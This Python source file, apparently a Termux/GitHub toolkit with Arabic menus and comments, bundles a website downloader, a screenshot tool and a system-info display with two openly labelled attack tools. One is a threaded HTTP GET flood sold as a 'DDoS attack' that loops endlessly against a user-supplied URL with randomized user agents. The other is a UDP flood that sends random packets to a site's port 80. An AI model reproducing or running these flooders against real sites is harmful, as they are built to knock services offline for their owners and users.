#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AS Web Tool - أداة AS المتكاملة للويب
الإصدار 2.0 - ملف واحد متكامل
متوافق مع Termux و GitHub
"""

import os
import sys
import time
import requests
import httpx
import urllib3
import urllib.request as urllib
import cloudscraper
import aiohttp
import asyncio
import random
import threading
import socket
import platform
import psutil
import re
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
from random import choice
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from PIL import Image, ImageDraw, ImageFont
import urllib.parse

# ========== نظام الألوان الموحد ==========
class Colors:
    RED = '\033[1;31m'
    PINK = '\033[1;35m'
    DARK_RED = '\033[2;31m'
    YELLOW = '\033[1;33m'
    GREEN = '\033[2;32m'
    BLUE = '\033[2;34m'
    PURPLE = '\033[2;35m'
    ORANGE = '\033[38;5;208m'
    LIGHT_BLUE = '\033[1;34m'
    WHITE = '\033[1;37m'
    CYAN = '\033[1;36m'
    RESET = '\033[0m'

C = Colors()

# ========== الدوال المساعدة ==========
def clear_screen():
    """مسح الشاشة"""
    os.system('cls' if os.name == 'nt' else 'clear')

def check_requirements():
    """التحقق من تثبيت المتطلبات"""
    required_libraries = [
        'requests', 'httpx', 'cloudscraper', 'aiohttp', 
        'bs4', 'psutil', 'PIL', 'user_agent'
    ]
    
    missing = []
    for lib in required_libraries:
        try:
            if lib == 'bs4':
                import bs4
            elif lib == 'PIL':
                from PIL import Image
            elif lib == 'user_agent':
                from user_agent import generate_user_agent
            else:
                __import__(lib)
        except ImportError:
            missing.append(lib)
    
    if missing:
        print(f"{C.RED}[!]{C.WHITE} المكتبات المفقودة: {', '.join(missing)}")
        print(f"{C.YELLOW}[?]{C.WHITE} جاري التثبيت التلقائي...")
        
        try:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print(f"{C.GREEN}[✓]{C.WHITE} تم تثبيت المكتبات بنجاح!")
        except Exception as e:
            print(f"{C.RED}[!]{C.WHITE} فشل في التثبيت: {e}")
            print(f"{C.CYAN}[i]{C.WHITE} حاول: pip install {' '.join(missing)}")
            return False
    
    return True

def is_termux():
    """التحقق إذا كان التشغيل على Termux"""
    return 'com.termux' in os.environ.get('PREFIX', '')

def get_storage_path():
    """الحصول على مسار التخزين المناسب"""
    if is_termux():
        base_path = "/storage/emulated/0/AS_Web_Tool/"
    else:
        base_path = "AS_Web_Tool/"
    
    # إنشاء المجلد إذا لم يكن موجوداً
    os.makedirs(base_path, exist_ok=True)
    return base_path

# ========== البانر والقوائم ==========
def main_banner():
    banner = f"""
{C.PURPLE}╔══════════════════════════════════════════════════════════════╗
{C.PURPLE}║{C.CYAN}         █████╗ ███████╗     ███████╗███████╗██████╗      {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ██╔══██╗██╔════╝     ██╔════╝██╔════╝██╔══██╗     {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ███████║███████╗     ███████╗█████╗  ██████╔╝     {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ██╔══██║╚════██║     ╚════██║██╔══╝  ██╔══██╗     {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ██║  ██║███████║     ███████║███████╗██║  ██║     {C.PURPLE}║
{C.PURPLE}║{C.CYAN}        ╚═╝  ╚═╝╚══════╝     ╚══════╝╚══════╝╚═╝  ╚═╝     {C.PURPLE}║
{C.PURPLE}║{C.YELLOW}           AS Web Tool - الإصدار 2.0 (Termux)           {C.PURPLE}║
{C.PURPLE}║{C.WHITE}              ملف واحد - متكامل - سريع               {C.PURPLE}║
{C.PURPLE}╚══════════════════════════════════════════════════════════════╝{C.RESET}
"""
    print(banner)

def show_menu():
    menu = f"""
{C.GREEN}╔══════════════════════════════════════════════════════════════╗
{C.GREEN}║{C.WHITE}                        القائمة الرئيسية                        {C.GREEN}║
{C.GREEN}╠══════════════════════════════════════════════════════════════╣
{C.GREEN}║ {C.CYAN}[1]{C.WHITE} هجوم DDoS على الموقع                               {C.GREEN}║
{C.GREEN}║ {C.CYAN}[2]{C.WHITE} هجوم UDP على الموقع                                {C.GREEN}║
{C.GREEN}║ {C.CYAN}[3]{C.WHITE} سحب موقع كامل                                     {C.GREEN}║
{C.GREEN}║ {C.CYAN}[4]{C.WHITE} أخذ لقطة للموقع                                   {C.GREEN}║
{C.GREEN}║ {C.CYAN}[5]{C.WHITE} معلومات النظام                                    {C.GREEN}║
{C.GREEN}║ {C.CYAN}[0]{C.WHITE} خروج                                               {C.GREEN}║
{C.GREEN}╚══════════════════════════════════════════════════════════════╝{C.RESET}
"""
    print(menu)

# ========== الأداة 1: هجوم DDoS ==========
class DDoSAttack:
    def __init__(self):
        self.good = self.gg = self.bb = 0
        self.url = ""
        self.num = 100

    def generate_headers(self):
        try:
            from user_agent import generate_user_agent
            user_agent = str(generate_user_agent())
        except:
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        
        accept_header = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        accept_language_header = choice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'fr-FR,fr;q=0.9'])
        
        headers = {
            'Accept': accept_header,
            'Accept-Language': accept_language_header,
            'User-Agent': user_agent,
        }
        return headers

    def print_stats(self):
        clear_screen()
        main_banner()
        stats = f"""
{C.YELLOW}╔══════════════════════════════════════════════════════════════╗
{C.YELLOW}║{C.WHITE}                     إحصائيات الهجوم                        {C.YELLOW}║
{C.YELLOW}╠══════════════════════════════════════════════════════════════╣
{C.YELLOW}║ {C.GREEN}[✓]{C.WHITE} هجمات ناجحة: {self.good:<20} 「{self.good}」 {C.YELLOW}║
{C.YELLOW}║ {C.ORANGE}[~]{C.WHITE} هجمات محتملة: {self.gg:<19} 「{self.gg}」 {C.YELLOW}║
{C.YELLOW}║ {C.RED}[✗]{C.WHITE} هجمات فاشلة: {self.bb:<20} 「{self.bb}」 {C.YELLOW}║
{C.YELLOW}║ {C.CYAN}[⚡]{C.WHITE} الهدف: {self.url:<30} {C.YELLOW}║
{C.YELLOW}╚══════════════════════════════════════════════════════════════╝{C.RESET}
"""
        print(stats)

    def send_requests(self):
        headers = self.generate_headers()
        try:
            response = requests.get(self.url, headers=headers, timeout=10)
            if response.status_code == 200:
                self.good += 1
            elif response.status_code >= 500:
                self.gg += 1
            else:
                self.bb += 1
        except:
            self.bb += 1
        self.print_stats()

    def send_httpx(self):
        headers = self.generate_headers()
        try:
            with httpx.Client() as client:
                response = client.get(self.url, headers=headers, timeout=10)
                if response.status_code == 200:
                    self.good += 1
                elif response.status_code >= 500:
                    self.gg += 1
                else:
                    self.bb += 1
        except:
            self.bb += 1
        self.print_stats()

    def start_attack(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    إعدادات هجوم DDoS                     {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        self.url = input(f"{C.YELLOW}[?]{C.WHITE} أدخل رابط الموقع: {C.GREEN}").strip()
        if not self.url:
            self.url = "http://example.com"
        
        try:
            num_input = input(f"{C.YELLOW}[?]{C.WHITE} عدد الثريدات (افتراضي 100): {C.GREEN}").strip()
            self.num = int(num_input) if num_input else 100
        except:
            self.num = 100
        
        print(f"{C.RED}[!]{C.WHITE} بدء الهجوم... {C.CYAN}Ctrl+C{Colors.WHITE} للإيقاف")
        
        def attack_worker():
            while True:
                try:
                    self.send_requests()
                    self.send_httpx()
                except:
                    pass

        threads = []
        for _ in range(self.num):
            thread = Thread(target=attack_worker, daemon=True)
            threads.append(thread)
            thread.start()

        try:
            for thread in threads:
                thread.join()
        except KeyboardInterrupt:
            print(f'\n{C.GREEN}[✓]{C.WHITE} تم إيقاف الهجوم')

# ========== الأداة 2: هجوم UDP ==========
class UDPAttack:
    def create_rnd_msg(self, msg_size):
        return ''.join(chr(random.randint(0, 255)) for _ in range(msg_size))

    def start_attack(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    إعدادات هجوم UDP                      {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        site = input(f"{C.YELLOW}[?]{C.WHITE} أدخل رابط الموقع: {C.GREEN}")
        if 'https://' in site:
            site = site.split('https://')[1]
        if '/' in site:
            site = site.split('/')[0]
        
        try:
            thread_count = int(input(f"{C.YELLOW}[?]{C.WHITE} عدد الثريدات: {C.GREEN}"))
        except:
            thread_count = 50
        
        UDP_PORT = 80
        
        try:
            ip = socket.gethostbyname(site)
        except:
            print(f"{C.RED}[!]{C.WHITE} لا يمكن حل اسم النطاق")
            return
        
        print(f"\n{C.YELLOW}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.YELLOW}║{C.WHITE}                     معلومات الهجوم                       {C.YELLOW}║")
        print(f"{C.YELLOW}╠══════════════════════════════════════════════════════════════╣")
        print(f"{C.YELLOW}║ {C.CYAN}↳{C.WHITE} البروتوكول: {C.GREEN}UDP{Colors.WHITE}                          {C.YELLOW}║")
        print(f"{C.YELLOW}║ {C.CYAN}↳{C.WHITE} IP الهدف: {C.GREEN}{ip}{Colors.WHITE}             {C.YELLOW}║")
        print(f"{C.YELLOW}║ {C.CYAN}↳{C.WHITE} البورت: {C.GREEN}{UDP_PORT}{Colors.WHITE}                              {C.YELLOW}║")
        print(f"{C.YELLOW}║ {C.CYAN}↳{C.WHITE} الثريدات: {C.GREEN}{thread_count}{Colors.WHITE}                             {C.YELLOW}║")
        print(f"{C.YELLOW}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        print(f"{C.RED}[!]{C.WHITE} بدء الهجوم... {C.CYAN}Ctrl+C{Colors.WHITE} للإيقاف")
        
        def udp_dos():
            try:
                msg = str.encode(self.create_rnd_msg(8))
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(msg, (ip, UDP_PORT))
                print(f"{C.GREEN}\r[✓] تم الإرسال {C.RESET}", end='')
            except:
                pass
        
        try:
            for i in range(thread_count):
                thread = threading.Thread(target=udp_dos)
                thread.daemon = True
                thread.start()
            
            # الانتظار حتى يتم الضغط على Ctrl+C
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{C.GREEN}[✓]{C.WHITE} تم إيقاف الهجوم")

# ========== الأداة 3: سحب موقع ==========
class WebsiteDownloader:
    def download_website(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    سحب موقع كامل                         {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        base_url = input(f"{C.YELLOW}[?]{C.WHITE} أدخل رابط الموقع: {C.GREEN}").strip()
        if not base_url.startswith(('http://', 'https://')):
            base_url = 'https://' + base_url
        
        download_folder = os.path.join(get_storage_path(), "Downloaded_Sites")
        os.makedirs(download_folder, exist_ok=True)
        
        print(f"{C.GREEN}[✓]{C.WHITE} جاري سحب الموقع...")
        print(f"{C.CYAN}[i]{C.WHITE} سيتم الحفظ في: {download_folder}")
        
        try:
            response = requests.get(base_url, timeout=10)
            if response.status_code == 200:
                # حفظ الصفحة الرئيسية
                domain = urlparse(base_url).netloc
                main_file = os.path.join(download_folder, f"{domain}_index.html")
                
                with open(main_file, 'w', encoding='utf-8') as f:
                    f.write(response.text)
                
                print(f"{C.GREEN}[✓]{C.WHITE} تم حفظ الصفحة الرئيسية")
                
                # تحليل الروابط
                soup = BeautifulSoup(response.text, 'html.parser')
                links = soup.find_all('a', href=True)
                
                print(f"{C.CYAN}[i]{C.WHITE} وجدت {len(links)} روابط")
                
            else:
                print(f"{C.RED}[!]{C.WHITE} فشل في الوصول للموقع: {response.status_code}")
                
        except Exception as e:
            print(f"{C.RED}[!]{C.WHITE} خطأ: {e}")
        
        print(f"\n{C.GREEN}[✓]{C.WHITE} اكتمل سحب الموقع")

# ========== الأداة 4: أخذ لقطة للموقع ==========
class ScreenshotTaker:
    def take_screenshot(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    أخذ لقطة للموقع                        {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        try:
            website_url = input(f"{C.YELLOW}[?]{C.WHITE} أدخل رابط الموقع: {C.GREEN}").strip()
            if not website_url.startswith(('http://', 'https://')):
                website_url = 'https://' + website_url
            
            storage_path = get_storage_path()
            screenshots_folder = os.path.join(storage_path, "Screenshots")
            os.makedirs(screenshots_folder, exist_ok=True)
            
            print(f"{C.GREEN}[✓]{C.WHITE} المجلد: {screenshots_folder}")
            print(f"{C.CYAN}[i]{C.WHITE} جاري أخذ اللقطة...")
            
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            domain = urlparse(website_url).netloc.replace('.', '_')
            
            screenshot_path = self.take_screenshot_api(website_url, screenshots_folder, domain, timestamp)
            
            if screenshot_path:
                print(f"{C.GREEN}[✓]{C.WHITE} تم حفظ اللقطة: {C.YELLOW}{screenshot_path}")
                
                # حفظ المعلومات
                info_file = self.save_site_info(website_url, screenshots_folder, domain, timestamp, screenshot_path)
                print(f"{C.GREEN}[✓]{C.WHITE} تم حفظ المعلومات: {C.YELLOW}{info_file}")
            else:
                print(f"{C.RED}[!]{C.WHITE} فشل في أخذ اللقطة")
                
        except Exception as e:
            print(f"{C.RED}[!]{C.WHITE} خطأ: {e}")

    def take_screenshot_api(self, url, folder, domain, timestamp):
        """أخذ لقطة باستخدام خدمات API"""
        services = [
            f"https://mini.s-shot.ru/1024x768/JPEG/1024/Z100/?{urllib.parse.quote(url)}",
            f"https://s0.wp.com/mshots/v1/{urllib.parse.quote(url)}?w=800"
        ]
        
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'}
        
        for i, service_url in enumerate(services):
            try:
                response = requests.get(service_url, headers=headers, timeout=30)
                if response.status_code == 200:
                    ext = 'jpg'
                    screenshot_path = os.path.join(folder, f"{domain}_{timestamp}.{ext}")
                    
                    with open(screenshot_path, 'wb') as f:
                        f.write(response.content)
                    
                    return screenshot_path
            except:
                continue
        
        # إذا فشلت الخدمات، إنشاء صورة بديلة
        return self.create_alternative_screenshot(url, folder, domain, timestamp)

    def create_alternative_screenshot(self, url, folder, domain, timestamp):
        """إنشاء صورة بديلة"""
        try:
            width, height = 800, 600
            img = Image.new('RGB', (width, height), color=(30, 30, 60))
            draw = ImageDraw.Draw(img)
            
            # استخدام خط افتراضي
            try:
                font = ImageFont.truetype("arial.ttf", 24)
            except:
                font = ImageFont.load_default()
            
            # معلومات الموقع
            info_lines = [
                "AS Web Tool - لقطة موقع",
                f"الموقع: {url}",
                f"الوقت: {time.ctime()}",
                "",
                "تعذر أخذ لقطة حقيقية",
                "هذه صورة بديلة بالمعلومات"
            ]
            
            # رسم النص
            y_pos = 150
            for line in info_lines:
                draw.text((width//2, y_pos), line, fill=(255, 255, 255), font=font, anchor="mm")
                y_pos += 40
            
            # حفظ الصورة
            screenshot_path = os.path.join(folder, f"{domain}_{timestamp}_info.png")
            img.save(screenshot_path, 'PNG')
            return screenshot_path
            
        except Exception as e:
            print(f"{C.YELLOW}[!]{C.WHITE} فشل في إنشاء الصورة: {e}")
            return None

    def save_site_info(self, url, folder, domain, timestamp, screenshot_path):
        """حفظ معلومات الموقع"""
        try:
            info_file = os.path.join(folder, f"info_{domain}_{timestamp}.txt")
            with open(info_file, 'w', encoding='utf-8') as f:
                f.write("="*50 + "\n")
                f.write("معلومات الموقع - AS Web Tool\n")
                f.write("="*50 + "\n")
                f.write(f"الرابط: {url}\n")
                f.write(f"الوقت: {time.ctime()}\n")
                f.write(f"مسار اللقطة: {screenshot_path}\n")
                f.write("="*50 + "\n")
            
            return info_file
        except Exception as e:
            print(f"{C.YELLOW}[!]{C.WHITE} فشل في حفظ المعلومات: {e}")
            return None

# ========== الأداة 5: معلومات النظام ==========
class SystemInfo:
    def show_info(self):
        clear_screen()
        main_banner()
        print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{C.CYAN}║{C.WHITE}                    معلومات النظام                         {C.CYAN}║")
        print(f"{C.CYAN}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
        
        try:
            # معلومات النظام
            print(f"{C.GREEN}[✓]{C.WHITE} النظام: {C.CYAN}{platform.system()} {platform.release()}")
            print(f"{C.GREEN}[✓]{C.WHITE} المعالج: {C.CYAN}{platform.processor() or 'غير معروف'}")
            print(f"{C.GREEN}[✓]{C.WHITE} اسم الجهاز: {C.CYAN}{socket.gethostname()}")
            
            # استخدام المعالج
            cpu_usage = psutil.cpu_percent(interval=1)
            print(f"{C.GREEN}[✓]{C.WHITE} استخدام المعالج: {C.CYAN}{cpu_usage}%")
            
            # الذاكرة
            memory = psutil.virtual_memory()
            print(f"{C.GREEN}[✓]{C.WHITE} استخدام الذاكرة: {C.CYAN}{memory.percent}%")
            
            # التخزين
            disk = psutil.disk_usage('/')
            print(f"{C.GREEN}[✓]{C.WHITE} استخدام التخزين: {C.CYAN}{disk.percent}%")
            
            # الشبكة
            print(f"\n{C.YELLOW}[↳]{C.WHITE} معلومات الشبكة:")
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        print(f"  {C.CYAN}{interface}: {C.WHITE}{addr.address}")
            
            # Termux معلومات إضافية
            if is_termux():
                print(f"\n{C.GREEN}[✓]{C.WHITE} البيئة: {C.CYAN}Termux")
                storage_path = get_storage_path()
                print(f"{C.GREEN}[✓]{C.WHITE} مسار التخزين: {C.CYAN}{storage_path}")
                
        except Exception as e:
            print(f"{C.RED}[!]{C.WHITE} خطأ في جمع المعلومات: {e}")

# ========== الوظيفة الرئيسية ==========
def main():
    # التحقق من المتطلبات
    if not check_requirements():
        return
    
    # كائنات الأدوات
    ddos = DDoSAttack()
    udp = UDPAttack()
    downloader = WebsiteDownloader()
    screenshot = ScreenshotTaker()
    system_info = SystemInfo()
    
    while True:
        clear_screen()
        main_banner()
        show_menu()
        
        choice = input(f"\n{C.YELLOW}[?]{C.WHITE} اختر الخيار [0-5]: {C.GREEN}").strip()
        
        if choice == '1':
            ddos.start_attack()
        elif choice == '2':
            udp.start_attack()
        elif choice == '3':
            downloader.download_website()
        elif choice == '4':
            screenshot.take_screenshot()
        elif choice == '5':
            system_info.show_info()
        elif choice == '0':
            print(f"\n{C.GREEN}[✓]{C.WHITE} شكراً لاستخدامك أداة AS!")
            print(f"{C.CYAN}[i]{C.WHITE} تابعنا على GitHub")
            break
        else:
            print(f"{C.RED}[!]{C.WHITE} خيار غير صحيح")
        
        input(f"\n{C.YELLOW}[?]{C.WHITE} اضغط Enter للمتابعة...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.GREEN}[✓]{C.WHITE} تم الخروج")
    except Exception as e:
        print(f"{C.RED}[!]{C.WHITE} خطأ: {e}")
